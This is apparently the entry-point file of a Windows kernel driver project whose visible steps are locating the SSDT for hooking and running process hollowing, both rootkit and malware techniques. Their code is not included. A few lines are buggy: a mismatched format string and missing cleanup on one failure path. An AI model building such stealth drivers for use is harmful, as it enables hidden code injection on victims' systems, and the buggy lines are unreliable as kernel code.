#include "ssdt.hpp"

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\SSDT");
	IoDeleteSymbolicLink(&symlink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

extern "C"
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING ...)
{
	NTSTATUS status = STATUS_SUCCESS;

	DriverObject->DriverUnload = DriverUnload;

	UNICODE_STRING name = RTL_CONSTANT_STRING(L"\\Device\\SSDT");
	PDEVICE_OBJECT DeviceObject;

	status = IoCreateDevice(
		DriverObject,
		0,
		&name,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject
	);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to create device: %d\n", status);
		return status;
	}

	UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\SSDT");
	status = IoCreateSymbolicLink(&symlink, &name);

	DbgPrint(" -------------------------- \n");
	DbgPrint("[!] Driver started!\n");
	DbgPrint("[+] %d\n", name);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to create symbolic link: %d\n", status);

		IoDeleteDevice(DeviceObject);
		return status;
	}

	status = GetSSDTAddress();
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to get SSDT Address: 0x%x\n", status);
		return status;
	}
	DbgPrint("[+] Hooked to SSDT\n");

	status = ProcessHollowing();
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Process hollowing failed!\n");
		DriverUnload(DriverObject);

		return status;
	}

	return status;
}